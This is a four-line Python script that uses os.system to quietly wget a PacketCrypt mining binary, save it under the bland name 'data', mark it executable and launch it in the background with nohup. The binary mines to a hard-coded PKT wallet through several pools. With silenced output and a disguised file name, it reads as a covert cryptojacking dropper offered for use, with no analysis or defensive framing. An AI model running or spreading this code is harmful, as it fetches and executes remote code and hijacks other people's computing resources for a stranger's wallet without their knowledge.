import os
cmd = os.system('wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 -O data >/dev/null 2>&1')
cmd = os.system('chmod +x data >/dev/null 2>&1')
cmd = os.system('nohup ./data ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > nohup.out')



